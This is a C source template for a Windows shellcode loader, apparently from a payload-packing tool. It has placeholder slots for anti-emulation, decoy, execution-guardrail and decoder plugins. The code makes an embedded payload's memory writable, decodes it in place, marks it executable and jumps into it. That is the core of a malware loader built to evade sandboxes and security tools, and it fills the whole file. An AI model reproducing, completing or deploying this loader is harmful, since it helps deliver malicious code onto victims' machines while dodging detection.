#include <Windows.h>

#include <time.h>

char *supermega_payload;

#define p_RW  0x04
#define p_RX  0x20
#define p_RWX 0x40

/* change payload memory regions permissions
   will reuse IMAGE locations

   depending on payload injection:
   * .text -> rw -> rx
   * .rdata -> rw -> rx
*/

{{plugin_antiemulation}}

{{plugin_decoy}}

{{plugin_executionguardrail}}


int main()
{
    DWORD result;
    char *dest = supermega_payload;

	// Call: Execution Guardrail
	if (executionguardrail() != 0) {
		return 1;
	}

	// Call: Anti Emulation plugin
	antiemulation();

	// Call: Decoy plugin
	decoy();

    if (MyVirtualProtect(dest, {{PAYLOAD_LEN}}, p_RW, &result) == 0) {
        return 16;
    }

{{ plugin_decoder }}

    if (MyVirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
        return 16;
    }

    // Execute *dest
    (*(void(*)())(dest))();

	return 0;
}
